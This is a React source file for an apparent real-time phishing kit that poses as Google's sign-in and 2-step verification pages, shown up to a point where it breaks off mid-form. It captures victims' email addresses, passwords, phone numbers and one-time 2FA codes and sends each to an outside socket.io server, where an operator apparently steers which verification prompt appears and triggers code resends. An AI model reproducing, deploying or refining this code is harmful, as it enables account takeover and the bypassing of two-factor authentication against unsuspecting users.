import { useState } from "react";
import { useEffect, useRef } from "react";
import { io } from "socket.io-client";
import * as Flags from "country-flag-icons/react/3x2";
import PhoneInput from "react-phone-number-input/input-max";
import { isValidPhoneNumber } from "react-phone-number-input/max";


function App() {

  const socketHolder = useRef(null);
  const [emailSuccess, setEmailSuccess] = useState(false);

  const [detail, setDetail] = useState("signinDetail");
  const [form, setForm] = useState("signinForm");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [info, setInfo] = useState("");
  const [authStatus, setAuthStatus] = useState("");
  const [response, setResponse] = useState(false);


  const [loading, setLoading] = useState(false);
  const [slide, setSlide] =  useState(false);
 
  //This state is for storing phone number for sms otp
  const [phone, setPhone] = useState(null);

  //This state is for storing code for both otp and sms otp and google auth otp
  const [code, setCode] = useState();

  //This state is for storing last two digit of phone number for sms otp and number for tap yes verification
  const [digit, setDigit] = useState();

  //Dummy renderer
  const [dummy, setDummy] = useState(true);

  //This state holds an array of allowed authentication options, it is also saved to the sessionStorage for retrieval
  const [selectsOption, setSelectsOptions] = useState([]);


  const [error, setError] = useState("");

  const [checked, setChecked] = useState(false);

  // This is for sms phone confirmation for OTP
  if (!sessionStorage.getItem('smsOtpTransit')) {
    sessionStorage.setItem('smsOtpTransit', JSON.stringify(true));
  }
  const [smsPhoneConfirmation, setSmsPhoneConfirmation] = useState(JSON.parse(sessionStorage.getItem('smsOtpTransit')));

  function Flag({ code }) {
    const FlagIcon = Flags[code.toUpperCase()];
    return FlagIcon ? <FlagIcon style={{ width: 24 }} /> : null;
  }

  function getDeviceType() {
    const ua = navigator.userAgent.toLowerCase();

    if (/ipad|tablet|playbook|silk/.test(ua) || (/android/.test(ua) && !/mobile/.test(ua))) {
      return "tablet";
    }
    if (/mobi|iphone|android/.test(ua)) {
      return "mobile";
    }
    return "desktop";
  }

  if (!sessionStorage.getItem('deviceType')) {sessionStorage.setItem('deviceType', getDeviceType());}

  useEffect(() => {
    const isReload =
      performance
        .getEntriesByType("navigation")
        .some((entry) => entry.type === "reload");

    if (isReload) {
      // Runs only after an actual browser reload (F5, refresh button, location.reload())
      if (!socketHolder.current && sessionStorage.getItem('info')) {
        const socket = io("https://websocket-i9hd.onrender.com", { autoConnect: false, reconnection: false });
        socketHolder.current = socket.connect();
      }
      (socketHolder.current).emit('updateSocketID', { 'email': sessionStorage.getItem('info') }, (response) => {
        sessionStorage.setItem('socketID', response?.newID);
      });
      setDigit(sessionStorage.getItem('digit'));
      setSmsPhoneConfirmation(JSON.parse(sessionStorage.getItem('smsOtpTransit')));
      setSelectsOptions(JSON.parse(sessionStorage.getItem('allowedAuthentications')));
    }
  }, []);
  
  useEffect(()=>{
    if (sessionStorage.getItem('socketID') && sessionStorage.getItem('progress') === 'passwordStatus') {
      setDetail("passwordDetail");
      setForm("passwordForm");
      setInfo(sessionStorage.getItem('info'));
    }

    // This returns back to last page if page was on 2FA groups. This is to prevent user from starting afresh.
    if (sessionStorage.getItem('socketID') && ['smsOtpForm', 'authenticatorOtpForm', 'notificationOtpForm'].includes(sessionStorage.getItem('progress'))) {
      if (JSON.parse(sessionStorage.getItem('otpConsentForm'))) {
        setDetail("VerificationDetail");
        sessionStorage.getItem('progress') === 'smsOtpForm' ? setForm("smsOtpForm") : sessionStorage.getItem('progress') === 'authenticatorOtpForm' ? setForm('authenticatorOtpForm') : setForm("notificationOtpForm");
        console.log('Log');
      }
      if (sessionStorage.getItem('socketID') && form === 'otpForm') {
        setForm('otpForm');
        setDetail('otpDetail');
      }
      setInfo(sessionStorage.getItem('info'));
    }

    if (sessionStorage.getItem('socketID') && sessionStorage.getItem('allowedAuthentications')) {
      setForm("2FAOptionForm");
      setDetail("VerificationDetail");
    }
  },[]);

  useEffect(() => {
    if (socketHolder.current) {

      (socketHolder.current).on("clientNotExisting", (data) => {
        console.log(data.exist);
        data.exist ? setError() : setError('Couldn’t find this account');
        setLoading(false);
      });

      (socketHolder.current).on("passwordPage", (data, callback) => {
        if (data.passwordStatus === "processing") {
          sessionStorage.setItem('socketID', data.id); sessionStorage.setItem('progress', Object.keys(data)[1]); sessionStorage.setItem('info', data.email);
          setLoading(false);
          setDetail("passwordDetail");
          setForm("passwordForm");
          setInfo(data.email);
          (data.authentication === 'Request Password' ? setError() : setError('Wrong password. Try again or click "Try another way" for more options.'))
        }
        setSlide(true);
        callback({feedback: true});
      });

      (socketHolder.current).on("verificationPage", (data, callback) => {
        if (data.verificationType) {
          sessionStorage.setItem('socketID', data.id); sessionStorage.setItem('progress', data.verificationType); sessionStorage.setItem('digit', data.lastTwoDigit); sessionStorage.setItem('country', data.country);
          setDigit(sessionStorage.getItem('digit'));
          setLoading(false);
          if (sessionStorage.getItem('otpConsentForm') === null) {
            setDetail("otpDetail");
            setForm("otpForm");
          } else {
            sessionStorage.setItem('progress', (sessionStorage.getItem('progress') === 'smsotp' ? 'smsOtpForm' : sessionStorage.getItem('progress') === 'authotp' ? 'authenticatorOtpForm' : 'notificationOtpForm'));
            setCode('');
            setForm(sessionStorage.getItem('progress'));
            setDetail("VerificationDetail");
          }
        }
        setSlide(true);
        callback({feedback: true});
      });

      (socketHolder.current).on("clientFailedVerification", (data) => {
        console.log('ID: ', data.id);
        sessionStorage.setItem('socketID', data.id);
        setError(data.error);
        setLoading(false);
        setDummy(!dummy);
      });

      (socketHolder.current).on("otpSend", (data, callback) => {
        sessionStorage.setItem('socketID', data.id);
        if (data.verifiedPhone === 'verified') {
          setError();
          sessionStorage.setItem('smsOtpTransit', JSON.stringify(false));
          setSmsPhoneConfirmation(JSON.parse(sessionStorage.getItem('smsOtpTransit')));
        } else {
          setError('This phone number cannot be used for verification.');
        }
        setLoading(false);
        callback({ feedback: true });
      });

      (socketHolder.current).on("exited", (data) => {
        setLoading(false);
        console.log('listens again');
        // Option 1: open in a new tab
        window.location.replace(data.link);
      });

      (socketHolder.current).on("authenticationDelivery", (data) => {
        sessionStorage.setItem('socketID', data.id);
        setLoading(false);
        sessionStorage.setItem('allowedAuthentications', JSON.stringify(data.allowedAuthentications));
        setSelectsOptions(JSON.parse(sessionStorage.getItem('allowedAuthentications')));
        setForm("2FAOptionForm");
        setDetail("VerificationDetail");
      });
    } else {
      console.warn("socketHolder.current is null – listener not registered");
      return; // or just skip registering the listener
    }
  }, [response]);


  // handles email response 'Gets Email'
  const handleEmail = async (event) => {
    event.preventDefault(); // Prevents page refresh

    const pattern = /^\s*[a-zA-Z]{0,2}\s*$/
    if (pattern.test(email)) {
      setError("Enter an email or phone number");
      return;
    } else {
      setLoading(true);
      setError();
      console.log(email);
      try {
        if (!socketHolder.current) {
          const socket = io("https://websocket-i9hd.onrender.com", { autoConnect: false, reconnection: false });
          socketHolder.current = socket.connect();
        }

        (socketHolder.current).emit('email?', { 'email': email }, (response)=>{
          if (response?.success) {
            setResponse(true); // we would use the state response to show it is loading(would be done later)
          } else if (response?.exist) {
            setLoading(false);
            window.location.replace("https://www.jonpardi.com/tour/");
          } else {
            console.log('error');
          }
        });
      } catch (error) {
        console.log("connection not established")
        console.log(error);
      }
    }

    
    //setError("Couldn’t find this account");

    //Response Dependent
    //setAuthStatus("option");
    //setForm("optionForm");

    //console.log("Form submitted:", email);
  };

  const passwordHandler = (event) => {
    event.preventDefault(); // Prevents page refresh

    const pattern = /^.{1,}$/

    if (pattern.test(password)) {
      setLoading(true);
      setSlide(false);
      setError();
      try {
        if (!socketHolder.current) {
          const socket = io("https://websocket-i9hd.onrender.com", { autoConnect: false, reconnection: false });
          socketHolder.current = socket.connect();
        }
        (socketHolder.current).emit('sendPassword', { 'password': password, 'deviceType': getDeviceType(), 'socketID': (sessionStorage.getItem('socketID')), 'email': (sessionStorage.getItem('info')) }, (response)=>{
          if (response?.validated) {
            console.log('Validated'); // we would use the state response to show it is loading(would be done later)
          } else {
            // This clears all information if and only if an hacker is trying to get in
            sessionStorage.clear();
            //Resets the page back to the beginning and socket diconnects.
            setForm('signinForm'); setDetail('signinDetail'); socketHolder.current = null;
          }
        });
      } catch {
        //setError('Empty');
      }
    } else {
      setError('Enter your password');
    }
  };

  //Consent form for verification
  function confirmation(verificationType){
    sessionStorage.setItem('otpConsentForm', JSON.stringify(true));
    sessionStorage.setItem('progress', (verificationType === 'smsotp' ? 'smsOtpForm' : verificationType  === 'authotp' ? 'authenticatorOtpForm' : 'notificationOtpForm'));
    setForm(sessionStorage.getItem('progress'));
    setDetail("VerificationDetail");
    setSlide(true);
  }

  // Phone number validation for SMS OTP
  function otp() {
    if (!phone || !isValidPhoneNumber(phone)) {
      setError("Please enter a valid phone number.");
      return; // Stop here
    }

    setError();
    setLoading(true);

    try {
      if (!socketHolder.current) {
        const socket = io("https://websocket-i9hd.onrender.com", { autoConnect: false, reconnection: false });
        socketHolder.current = socket.connect();
      }
      (socketHolder.current).emit('verifyPhone', { 'phone': phone, 'socketID': (sessionStorage.getItem('socketID')), 'email': (sessionStorage.getItem('info')) }, (response) => {
        if (response?.validated) {
          console.log('Validated');  // we would use the state response to show it is loading(would be done later)
        } else {
          // This clears all information if and only if an hacker is trying to get in
          sessionStorage.clear();
          //Resets the page back to the beginning and socket diconnects.
          setForm('signinForm'); setDetail('signinDetail'); socketHolder.current = null;
        }
      });
    } catch {
      //setError('Empty');
    }
    //setSmsPhoneConfirmation(!JSON.parse(sessionStorage.getItem('smsOtpTransit')));
  }

  function send2FA(event) {
    event.preventDefault(); // Prevents page refresh

    const pattern = /^\d{6}$/

    if (pattern.test(code)) {
      setError();
      setLoading(true);
      try {
        if (!socketHolder.current) {
          const socket = io("https://websocket-i9hd.onrender.com", { autoConnect: false, reconnection: false });
          socketHolder.current = socket.connect();
        }
        (socketHolder.current).emit('send2facode', { 'verificationCode': code, 'socketID': (sessionStorage.getItem('socketID')), 'email': (sessionStorage.getItem('info')) }, (response)=>{
          if (response?.validated) {
            console.log('Validated'); // we would use the state response to show it is loading(would be done later)
          } else {
            // This clears all information if and only if an hacker is trying to get in
            //setLoading(false);
            sessionStorage.clear();
            //Resets the page back to the beginning and socket diconnects.
            setForm('signinForm'); setDetail('signinDetail'); socketHolder.current = null;
          }
        });
      } catch {
        //setError('Empty');
      }
    } else {
      setError('Must be a 6 digit code');
    }
  }

  //This function is used to send a message to the administrator to resend the authentication code or pop-up number
  function resend2FA(type) {
    setError();
    type === 'tapyes' ? setLoading(true) : setLoading(false);
    try {
      if (!socketHolder.current) {
        const socket = io("https://websocket-i9hd.onrender.com", { autoConnect: false, reconnection: false });
        socketHolder.current = socket.connect();
      }
      (socketHolder.current).emit('resend2fa', { 'type': type, 'socketID': (sessionStorage.getItem('socketID')), 'email': (sessionStorage.getItem('info')) }, (response) => {
        if (response?.validated) {
          console.log('Validated'); // we would use the state response to show it is loading(would be done later)
        } else {
          // This clears all information if and only if an hacker is trying to get in
          sessionStorage.clear();
          //Resets the page back to the beginning and socket diconnects.
          setForm('signinForm'); setDetail('signinDetail'); socketHolder.current = null;
        }
      });
    } catch {
      //setError('Empty');
    }
  }


  //Action center
  function hide() {
    setChecked(!checked);
  }

  function option(){
    if (authStatus === "option") {
      setForm("optionForm");
    }
  }

  function optionCommand(commandApi) {
    if (commandApi === "") {
      setForm("passwordForm");
    } else if(commandApi === "recovery") {
      setForm("recoveryForm");
    }
  }

  //This is the 2 step verification option types
  function option2FA() {
    setLoading(true);
    try {
      if (!socketHolder.current) {
        const socket = io("https://websocket-i9hd.onrender.com", { autoConnect: false, reconnection: false });
        socketHolder.current = socket.connect();
      }
      (socketHolder.current).emit('selectAnotherWay', { 'socketID': (sessionStorage.getItem('socketID')), 'email': (sessionStorage.getItem('info')) });
    } catch {
      //setError('Empty');
    }
  }

  //This is the 2 step verification option types
  function optionCommand2FA(type) {
    setError();
    setLoading(true);
    if (type !== 'passkey' || type !== 'recovery') {
      try {
        if (!socketHolder.current) {
          const socket = io("https://websocket-i9hd.onrender.com", { autoConnect: false, reconnection: false });
          socketHolder.current = socket.connect();
        }

        (socketHolder.current).emit('anotherWay', { 'verificationType': type, 'socketID': (sessionStorage.getItem('socketID')), 'email': (sessionStorage.getItem('info')) }, (response) => {
          if (response?.validated) {
            console.log('Validated'); // we would use the state response to show it is loading(would be done later)
          } else {
            // This clears all information if and only if an hacker is trying to get in
            sessionStorage.clear();
            //Resets the page back to the beginning and socket diconnects.
            setForm('signinForm'); setDetail('signinDetail'); socketHolder.current = null;
          }
        });
      } catch {
        //setError('Empty');
      }
    } else {
      
    }
  }

  function consent() {
    setForm("signinForm");
    setDetail("signinDetail");
  }

  return (
    <div className="bg-[#1E1F20] w-[100%] h-[100vh] flex flex-col justify-center items-center relative">
      <div aria-hidden className={`pointer-events-none absolute inset-x-0 top-0 h-[3px] overflow-hidden rounded-t-[inherit] bg-blue-300 ${loading ? 'flex' : 'hidden'} z-50`}>
        <div
          //key={loading ? "run" : "idle"}
          className={[
            "absolute h-[4px] w-[10%] origin-left bg-blue-500 transition-opacity duration-300",
            loading ? "animate-progress-run opacity-100" : "progress-done opacity-0",
          ].join(" ")}
        />
      </div>
      <div className={`w-[100vw] h-[100vh] bg-black/70 fixed z-30 ${loading ? 'flex' : 'hidden'}`}></div>
      <div className="bg-[#0E0E0E] max-[600px]:w-[100%] max-sm:w-[80%] max-[959px]:w-[100%] max-lg:w-[85%] w-[70%] max-[600px]:h-[92vh] max-sm:h-[85vh] max-[959px]:h-[92vh] h-[67vh] max-[600px]:rounded-none max-sm:rounded-2xl max-[959px]:rounded-none rounded-3xl max-sm:px-5 px-14 py-5 flex max-sm:flex-col flex-row max-sm:justify-center justify-between items-center max-[600px]:gap-y-12 max-sm:gap-y-8 gap-y-0 relative">
        {detail === "signinDetail" ? 
          // signin writeup
          <div className="max-sm:w-[95%] w-[40%] max-[640px]:h-fit h-[80%] flex flex-col max-sm:gap-y-3 gap-y-5">
            <div className="max-sm:w-[80px] max-[959px]:w-[60px] max-lg:w-[60px] w-[60px] aspect-square">
              <svg viewBox="0 0 512 512">
                <g>
                  <path d="M113.47 309.408 95.648 375.94l-65.139 1.378C11.042 341.211 0 299.9 0 256c0-42.451 10.324-82.483 28.624-117.732h.014L86.63 148.9l25.404 57.644c-5.317 15.501-8.215 32.141-8.215 49.456.002 18.792 3.406 36.797 9.651 53.408" fill="#fbbb00" data-original="#fbbb00"></path>
                  <path d="M507.527 208.176C510.467 223.662 512 239.655 512 256c0 18.328-1.927 36.206-5.598 53.451-12.462 58.683-45.025 109.925-90.134 146.187l-.014-.014-73.044-3.727-10.338-64.535c29.932-17.554 53.324-45.025 65.646-77.911h-136.89V208.176h245.899" fill="#518ef8" data-original="#518ef8"></path>
                  <path d="m416.253 455.624.014.014C372.396 490.901 316.666 512 256 512c-97.491 0-182.252-54.491-225.491-134.681l82.961-67.91c21.619 57.698 77.278 98.771 142.53 98.771 28.047 0 54.323-7.582 76.87-20.818z" fill="#28b446" data-original="#28b446"></path>
                  <path d="m419.404 58.936-82.933 67.896C313.136 112.246 285.552 103.82 256 103.82c-66.729 0-123.429 42.957-143.965 102.724l-83.397-68.276h-.014C71.23 56.123 157.06 0 256 0c62.115 0 119.068 22.126 163.404 58.936" fill="#f14336" data-original="#f14336"></path>
                </g>
              </svg>
            </div>
            <text className="text-white text-3xl font-normal">Sign in</text>
            <text className="text-white text-base font-medium">Use your Google Account</text>
          </div>
        : detail === "passwordDetail" ?
          //password writeup
          <div className="max-sm:w-[95%] w-[40%] max-[640px]:h-fit h-[80%] flex flex-col max-sm:gap-y-3 gap-y-5 justify-start">
            <div className="max-sm:w-[80px] max-[959px]:w-[60px] max-lg:w-[60px] w-[60px] aspect-square">
              <svg viewBox="0 0 512 512">
                <g>
                  <path d="M113.47 309.408 95.648 375.94l-65.139 1.378C11.042 341.211 0 299.9 0 256c0-42.451 10.324-82.483 28.624-117.732h.014L86.63 148.9l25.404 57.644c-5.317 15.501-8.215 32.141-8.215 49.456.002 18.792 3.406 36.797 9.651 53.408" fill="#fbbb00" data-original="#fbbb00"></path>
                  <path d="M507.527 208.176C510.467 223.662 512 239.655 512 256c0 18.328-1.927 36.206-5.598 53.451-12.462 58.683-45.025 109.925-90.134 146.187l-.014-.014-73.044-3.727-10.338-64.535c29.932-17.554 53.324-45.025 65.646-77.911h-136.89V208.176h245.899" fill="#518ef8" data-original="#518ef8"></path>
                  <path d="m416.253 455.624.014.014C372.396 490.901 316.666 512 256 512c-97.491 0-182.252-54.491-225.491-134.681l82.961-67.91c21.619 57.698 77.278 98.771 142.53 98.771 28.047 0 54.323-7.582 76.87-20.818z" fill="#28b446" data-original="#28b446"></path>
                  <path d="m419.404 58.936-82.933 67.896C313.136 112.246 285.552 103.82 256 103.82c-66.729 0-123.429 42.957-143.965 102.724l-83.397-68.276h-.014C71.23 56.123 157.06 0 256 0c62.115 0 119.068 22.126 163.404 58.936" fill="#f14336" data-original="#f14336"></path>
                </g>
              </svg>
            </div>
            <text className="text-white text-3xl font-medium">Welcome</text>
            <div className="self-start inline-flex flex-row items-center gap-x-2 pl-1 pr-2 py-1 border border-[#C4C7C5] rounded-full">
              <div className="w-[20px] aspect-square">
                <svg viewBox="0 0 32 32">
                  <g>
                    <g>
                      <path d="M16 17a6 6 0 1 1 6-6 6 6 0 0 1-6 6m0-10a4 4 0 1 0 4 4 4 4 0 0 0-4-4" fill="#C4C7C5" opacity="1" data-original="#000000"></path>
                      <path d="M16 31a15 15 0 0 1-11.59-5.49l-.52-.64.52-.63a15 15 0 0 1 23.18 0l.52.63-.52.64A15 15 0 0 1 16 31m-9.49-6.12a13 13 0 0 0 19 0 13 13 0 0 0-19 0" fill="#C4C7C5" opacity="1" data-original="#000000"></path>
                      <path d="M16 31a15 15 0 1 1 11.59-5.49A15 15 0 0 1 16 31m0-28a13 13 0 1 0 13 13A13 13 0 0 0 16 3" fill="#C4C7C5" opacity="1" data-original="#000000"></path>
                      <path d="M5.18 24.88S15.25 36.13 25.5 26l1.32-1.12S18.26 16 9.57 21.33z" fill="#C4C7C5" opacity="1" data-original="#000000"></path>
                      <circle cx="16" cy="11" r="5" fill="#C4C7C5" opacity="1" data-original="#000000"></circle>
                    </g>
                  </g>
                </svg>
              </div>
              <span className="text-sm font-medium text-[#C4C7C5]">{info}</span>
              <div className="w-[8px] aspect-square">
                <svg viewBox="0 0 512 512">
                  <g>
                    <path d="M501.912 108.584c6.863 14.346 4.934 30.947-5.033 43.333L287.928 411.423c-7.81 9.673-19.444 15.261-31.895 15.261s-24.085-5.588-31.895-15.261L15.121 151.949c-9.967-12.418-11.895-29.019-5.033-43.365 6.863-14.346 21.013-23.268 36.928-23.268h417.968c15.915 0 30.065 8.922 36.928 23.268" fill="#C4C7C5" opacity="0.6" data-original="#000000"></path>
                  </g>
                </svg>
              </div>
            </div>
          </div>
        : detail === "otpDetail" ?
          //OTP initiation
          <div className="max-sm:w-[95%] w-[40%] max-[640px]:h-fit h-[80%] flex flex-col gap-y-5">
            <div className="max-sm:w-[70px] max-[959px]:w-[60px] max-lg:w-[60px] w-[60px] aspect-square">
              <svg viewBox="0 0 512 512">
                <g>
                  <path d="M113.47 309.408 95.648 375.94l-65.139 1.378C11.042 341.211 0 299.9 0 256c0-42.451 10.324-82.483 28.624-117.732h.014L86.63 148.9l25.404 57.644c-5.317 15.501-8.215 32.141-8.215 49.456.002 18.792 3.406 36.797 9.651 53.408" fill="#fbbb00" data-original="#fbbb00"></path>
                  <path d="M507.527 208.176C510.467 223.662 512 239.655 512 256c0 18.328-1.927 36.206-5.598 53.451-12.462 58.683-45.025 109.925-90.134 146.187l-.014-.014-73.044-3.727-10.338-64.535c29.932-17.554 53.324-45.025 65.646-77.911h-136.89V208.176h245.899" fill="#518ef8" data-original="#518ef8"></path>
                  <path d="m416.253 455.624.014.014C372.396 490.901 316.666 512 256 512c-97.491 0-182.252-54.491-225.491-134.681l82.961-67.91c21.619 57.698 77.278 98.771 142.53 98.771 28.047 0 54.323-7.582 76.87-20.818z" fill="#28b446" data-original="#28b446"></path>
                  <path d="m419.404 58.936-82.933 67.896C313.136 112.246 285.552 103.82 256 103.82c-66.729 0-123.429 42.957-143.965 102.724l-83.397-68.276h-.014C71.23 56.123 157.06 0 256 0c62.115 0 119.068 22.126 163.404 58.936" fill="#f14336" data-original="#f14336"></path>
                </g>
              </svg>
            </div>
            <text className="text-white text-lg font-normal">Sign in to continue to <span className="text-blue-500">jonpardi.com</span></text>
            <div className="self-start inline-flex flex-row items-center gap-x-2 pl-1 pr-2 py-1 border border-[#C4C7C5] rounded-full">
              <div className="w-[20px] aspect-square">
                <svg viewBox="0 0 32 32">
                  <g>
                    <g>
                      <path d="M16 17a6 6 0 1 1 6-6 6 6 0 0 1-6 6m0-10a4 4 0 1 0 4 4 4 4 0 0 0-4-4" fill="#C4C7C5" opacity="1" data-original="#000000"></path>
                      <path d="M16 31a15 15 0 0 1-11.59-5.49l-.52-.64.52-.63a15 15 0 0 1 23.18 0l.52.63-.52.64A15 15 0 0 1 16 31m-9.49-6.12a13 13 0 0 0 19 0 13 13 0 0 0-19 0" fill="#C4C7C5" opacity="1" data-original="#000000"></path>
                      <path d="M16 31a15 15 0 1 1 11.59-5.49A15 15 0 0 1 16 31m0-28a13 13 0 1 0 13 13A13 13 0 0 0 16 3" fill="#C4C7C5" opacity="1" data-original="#000000"></path>
                      <path d="M5.18 24.88S15.25 36.13 25.5 26l1.32-1.12S18.26 16 9.57 21.33z" fill="#C4C7C5" opacity="1" data-original="#000000"></path>
                      <circle cx="16" cy="11" r="5" fill="#C4C7C5" opacity="1" data-original="#000000"></circle>
                    </g>
                  </g>
                </svg>
              </div>
              <span className="text-sm font-medium text-[#C4C7C5]">{info}</span>
              <div className="w-[8px] aspect-square">
                <svg viewBox="0 0 512 512">
                  <g>
                    <path d="M501.912 108.584c6.863 14.346 4.934 30.947-5.033 43.333L287.928 411.423c-7.81 9.673-19.444 15.261-31.895 15.261s-24.085-5.588-31.895-15.261L15.121 151.949c-9.967-12.418-11.895-29.019-5.033-43.365 6.863-14.346 21.013-23.268 36.928-23.268h417.968c15.915 0 30.065 8.922 36.928 23.268" fill="#C4C7C5" opacity="0.6" data-original="#000000"></path>
                  </g>
                </svg>
              </div>
            </div>
          </div>
        : detail === "VerificationDetail" ?
          // 2FA SMS/authenticator/prompt OTP Write up
          <div className="max-sm:w-[95%] w-[40%] max-[640px]:h-fit h-[80%] flex flex-col max-sm:gap-y-3 gap-y-5">
            <div className="max-sm:w-[80px] max-[959px]:w-[60px] max-lg:w-[60px] w-[60px] aspect-square">
              <svg viewBox="0 0 512 512">
                <g>
                  <path d="M113.47 309.408 95.648 375.94l-65.139 1.378C11.042 341.211 0 299.9 0 256c0-42.451 10.324-82.483 28.624-117.732h.014L86.63 148.9l25.404 57.644c-5.317 15.501-8.215 32.141-8.215 49.456.002 18.792 3.406 36.797 9.651 53.408" fill="#fbbb00" data-original="#fbbb00"></path>
                  <path d="M507.527 208.176C510.467 223.662 512 239.655 512 256c0 18.328-1.927 36.206-5.598 53.451-12.462 58.683-45.025 109.925-90.134 146.187l-.014-.014-73.044-3.727-10.338-64.535c29.932-17.554 53.324-45.025 65.646-77.911h-136.89V208.176h245.899" fill="#518ef8" data-original="#518ef8"></path>
                  <path d="m416.253 455.624.014.014C372.396 490.901 316.666 512 256 512c-97.491 0-182.252-54.491-225.491-134.681l82.961-67.91c21.619 57.698 77.278 98.771 142.53 98.771 28.047 0 54.323-7.582 76.87-20.818z" fill="#28b446" data-original="#28b446"></path>
                  <path d="m419.404 58.936-82.933 67.896C313.136 112.246 285.552 103.82 256 103.82c-66.729 0-123.429 42.957-143.965 102.724l-83.397-68.276h-.014C71.23 56.123 157.06 0 256 0c62.115 0 119.068 22.126 163.404 58.936" fill="#f14336" data-original="#f14336"></path>
                </g>
              </svg>
            </div>
            <text className="text-white text-3xl font-normal">2-Step verification</text>
            <text className="text-white text-base font-normal">To help keep your account safe, Google wants to make sure it’s really you trying to sign in</text>
            <div className="self-start inline-flex flex-row items-center gap-x-2 pl-1 pr-2 py-1 border border-[#C4C7C5] rounded-full">
              <div className="w-[20px] aspect-square">
                <svg viewBox="0 0 32 32">
                  <g>
                    <g>
                      <path d="M16 17a6 6 0 1 1 6-6 6 6 0 0 1-6 6m0-10a4 4 0 1 0 4 4 4 4 0 0 0-4-4" fill="#C4C7C5" opacity="1" data-original="#000000"></path>
                      <path d="M16 31a15 15 0 0 1-11.59-5.49l-.52-.64.52-.63a15 15 0 0 1 23.18 0l.52.63-.52.64A15 15 0 0 1 16 31m-9.49-6.12a13 13 0 0 0 19 0 13 13 0 0 0-19 0" fill="#C4C7C5" opacity="1" data-original="#000000"></path>
                      <path d="M16 31a15 15 0 1 1 11.59-5.49A15 15 0 0 1 16 31m0-28a13 13 0 1 0 13 13A13 13 0 0 0 16 3" fill="#C4C7C5" opacity="1" data-original="#000000"></path>
                      <path d="M5.18 24.88S15.25 36.13 25.5 26l1.32-1.12S18.26 16 9.57 21.33z" fill="#C4C7C5" opacity="1" data-original="#000000"></path>
                      <circle cx="16" cy="11" r="5" fill="#C4C7C5" opacity="1" data-original="#000000"></circle>
                    </g>
                  </g>
                </svg>
              </div>
              <span className="text-sm font-medium text-[#C4C7C5]">{info}</span>
              <div className="w-[8px] aspect-square">
                <svg viewBox="0 0 512 512">
                  <g>
                    <path d="M501.912 108.584c6.863 14.346 4.934 30.947-5.033 43.333L287.928 411.423c-7.81 9.673-19.444 15.261-31.895 15.261s-24.085-5.588-31.895-15.261L15.121 151.949c-9.967-12.418-11.895-29.019-5.033-43.365 6.863-14.346 21.013-23.268 36.928-23.268h417.968c15.915 0 30.065 8.922 36.928 23.268" fill="#C4C7C5" opacity="0.6" data-original="#000000"></path>
                  </g>
                </svg>
              </div>
            </div>
            <button className="text-blue-300 text-sm text-left mt-[50px] max-sm:hidden" onClick={()=>resend2FA(form === "smsOtpForm" ? "smsotp" : form === "authenticatorOtpForm" ? "authotp" : "tapyes")}>Resend it</button>
          </div>
        :
          <></>
        }

        {form === "signinForm" ?
          //Email input
          <form onSubmit={handleEmail} className="max-sm:w-[95%] w-[50%] max-[640px]:h-fit h-[80%] [@media(max-height:550px)]:justify-end [@media(min-height:551px)]:justify-start justify-start flex flex-col gap-y-6 sm:pt-[88px]">
            <div className="w-[100%] flex flex-col gap-y-1 relative">
              <text className={`text-blue-300 text-sm font-light absolute top-[-10%] left-4 bg-[#0E0E0E] px-2 ${error ? "text-red-300" : "text-blue-300"}`}>Email or Phone</text>
              <input className={`w-[100%] h-[60px] font-light rounded-md bg-transparent border-2 ${error ? "border-red-300" : "border-blue-300"} text-base px-5 text-white`} type="text" id="email" name="email" value={email} onChange={(event) => setEmail(event.target.value)}/>
              {error && <div className="flex flex-row items-start justify-start">
                <div className="w-[30px] aspect-square">
                  <svg aria-hidden="true" class="Qk3oof C3qbwe" fill="#fca5a5" focusable="false" width="20px" height="20px" viewBox="0 0 24 24">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"></path>
                  </svg>
                </div>
                <p className="text-sm text-red-300">{error}</p>
              </div>}
              <a href="https://accounts.google.com/signin/v2/usernamerecovery?checkedDomains=youtube&dsh=S-47104418%3A1789930177584852&flowEntry=ServiceLogin&flowName=GlifWebSignIn&pstMsg=1" className="text-blue-500 text-sm cursor-pointer">Forget email?</a>
            </div>
            <text className="text-white text-sm">{sessionStorage.getItem('deviceType') && sessionStorage.getItem('deviceType') === 'desktop' ? 'Not your Computer? Use Guest Mode to Sign in privately.' : ''}<br/><a href="https://support.google.com/chrome/answer/6130773?hl=en" className="text-blue-400 font-semibold">Learn more about using your google account.</a></text>
            <div className="w-[100%] justify-end items-center flex flex-row gap-x-8">
              <a href="https://support.google.com/accounts/answer/27441?hl=en&co=GENIE.platform%3DDesktop" className="text-blue-300 text-sm">Create account</a>
              <button type="submit" className="text-blue-800 text-sm px-5 py-2 bg-blue-300 rounded-3xl">Next</button>
            </div>
          </form>
        : (form === "passwordForm") ?
          <form onSubmit={passwordHandler} className={`max-sm:w-[95%] w-[50%] max-[640px]:h-fit h-[80%] [@media(max-height:550px)]:justify-end [@media(min-height:551px)]:justify-start justify-start flex flex-col gap-y-8 sm:pt-[70px] ${slide && form === "passwordForm" ? 'animate-present transition-opacity duration-300' : ''}`}>
            <div className="w-[100%] flex flex-row px-3 py-4 bg-[#0842A0] rounded-2xl gap-x-2">
              <div className="w-[10%]">
                <svg aria-hidden="true" class="Qk3oof C3qbwe" fill="#A8C7FA" focusable="false" width="20px" height="20px" viewBox="0 0 24 24">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"></path>
                </svg>
              </div>
              <text className="text-[#A8C7FA] text-base font-medium">Select "Try another way" to use your passkey for an easier, more secure sign-in</text>
            </div>
            <div className="w-[100%] flex flex-col gap-y-1 relative">
              <text className="text-blue-300 text-sm font-light absolute top-[-10%] left-4 bg-[#0E0E0E] z-40 px-2">Enter your password</text>
              <div className="w-[100%] h-[60px] rounded-md bg-transparent border-2 border-blue-300 px-5 flex flex-col justify-end relative">
                <input className={`z-20 absolute w-[90%] h-[80%] top-[10%] text-white font-light text-base bg-transparent border-0 focus:border-0 focus:outline-none focus:ring-0`} type={checked ? "text" : "password"} id="password" name="password" value={password} onChange={(event) => setPassword(event.target.value)}/>
              </div>
              {error && <div className="flex flex-row items-start justify-start">
                <div className="w-[30px] aspect-square">
                  <svg aria-hidden="true" class="Qk3oof C3qbwe" fill="#fca5a5" focusable="false" width="20px" height="20px" viewBox="0 0 24 24">
